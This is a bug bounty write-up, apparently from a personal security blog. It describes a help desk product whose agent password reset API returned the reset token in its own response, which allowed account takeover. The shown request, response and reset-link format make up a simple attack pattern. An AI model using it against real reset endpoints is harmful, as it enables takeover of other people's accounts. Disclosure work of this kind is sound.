---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-12-30_tale-of-a-misconfiguration-in-password-reset.md
original_filename: 2018-12-30_tale-of-a-misconfiguration-in-password-reset.md
title: Tale of a Misconfiguration in Password Reset
category: documents
detected_topics:
- password-reset
- xss
- command-injection
- otp
tags:
- imported
- documents
- password-reset
- xss
- command-injection
- otp
language: en
raw_sha256: 53aaf3346aa40009ec4fa604d78fdd2fa6266ef5fccfc9432f2221b30e17e2c6
text_sha256: bf16e7ee6155854d17cba6b10cb0376c60b82df03d50a859a86d216f44fa2da0
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# Tale of a Misconfiguration in Password Reset

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-12-30_tale-of-a-misconfiguration-in-password-reset.md
- Source Type: markdown
- Detected Topics: password-reset, xss, command-injection, otp
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `53aaf3346aa40009ec4fa604d78fdd2fa6266ef5fccfc9432f2221b30e17e2c6`
- Text SHA256: `bf16e7ee6155854d17cba6b10cb0376c60b82df03d50a859a86d216f44fa2da0`


## Content

---
title: "Tale of a Misconfiguration in Password Reset"
page_title: "cat ~/footstep.ninja/blog.txt"
url: "https://footstep.ninja/posts/password-reset/"
final_url: "https://footstep.ninja/posts/password-reset/"
authors: ["Shuaib Oladigbolu (@_sawzeeyy)"]
bugs: ["Password reset"]
publication_date: "2018-12-30"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5496
---

# Tale of a Misconfiguration in Password Reset

  * Dec 30, 2018
  * 2 min read

This post is about a misconfiguration in password reset I found on a popular help desk software sometimes ago where they were leaking the reset token. And guess what? This was not in the `Referer` header :D but right in the response of the request itself.

![Shocked](https://media2.giphy.com/media/Lcn0yF1RcLANG/200.webp?cid=3640f6095c28779933726c4c6314227f)

In this case one could initiate password reset for an account and immediately receive the reset token for that account.

The request looked like the following:
  
  
  POST /api/v1/base/password/reset HTTP/1.1
  Host: [team_name].redacted.com
  User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0
  Accept: application/json, text/javascript, */*; q=0.01
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 26
  Connection: keep-alive
  
  email=[agent_email_address]

And the response was:
  
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Tue, 25 Oct 2016 20:00:29 GMT
  Content-Type: application/json
  Content-Length: 2194
  Connection: keep-alive
  Cache-Control: private, max-age=0, must-revalidate
  Expires: 0
  X-API-Version: 1
  Date-ISO: 2016-10-25T20:00:29+00:00
  Access-Control-Expose-Headers: Date-ISO
  X-XSS-Protection: 1; mode=block
  X-Content-Type-Options: nosniff
  Date-ISO: 2016-10-25T20:00:29+00:00
  Access-Control-Expose-Headers: Date-ISO
  
  { "status": 200, "notifications": [ { "type": "SUCCESS", "message": "Password reset email sent to [Name]", "sticky": false } ], "auth_token": "[token]" }

Notice the `auth_token`? Yes! That’s the reset token you would receive in email on a valid password reset request. And the format of the password reset link was:
  
  
  https://[team_name].redacted.com/Auth/ResetPassword/[auth_token]
  

Inserting the `auth_token` irrespective of the team name (as long as you use an existing team name) made it possible to reset the password to that account. And one could then proceed to login to this account(s) taking full control.

This was an easy win but considering that it was an help desk software, it also made it critical.

### Takeaways?

  * They had options user and agent accounts: the password reset endpoint for users wasn’t vulnerable but that of agents was vulnerable which makes this an easy one to miss. So it is best to test functionalities having in mind that they may not have the same code base as identified here.
  * Always check response to requests whenever you expect to receive a token in email.

Thanks to the team for fixing this almost immediately (within 2 hours of report). And thank you also for taking the time to read this.

### Timeline

Oct 25, 2016 – Report Sent

Oct 25, 2016 – Report Triaged

Oct 25, 2016 – Fixed!

Oct 26, 2016 – Bounty awarded

Share on [](https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f)[](https://twitter.com/intent/tweet/?text=I%20just%20read%20"Tale%20of%20a%20Misconfiguration%20in%20Password%20Reset"&url=https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f)[](mailto:?subject=I%20just%20read%20"Tale%20of%20a%20Misconfiguration%20in%20Password%20Reset"&body=https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f)[](https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f&title=I%20just%20read%20"Tale%20of%20a%20Misconfiguration%20in%20Password%20Reset"&summary=I%20just%20read%20"Tale%20of%20a%20Misconfiguration%20in%20Password%20Reset"&source=https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f)[](https://reddit.com/submit/?url=https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f&resubmit=true&title=I%20just%20read%20"Tale%20of%20a%20Misconfiguration%20in%20Password%20Reset")[](whatsapp://send?text=I%20just%20read%20"Tale%20of%20a%20Misconfiguration%20in%20Password%20Reset"%20https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f)[](https://news.ycombinator.com/submitlink?u=https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f&t=I%20just%20read%20"Tale%20of%20a%20Misconfiguration%20in%20Password%20Reset")[](https://telegram.me/share/url?text=I%20just%20read%20"Tale%20of%20a%20Misconfiguration%20in%20Password%20Reset"&url=https%3a%2f%2ffootstep.ninja%2fposts%2fpassword-reset%2f)
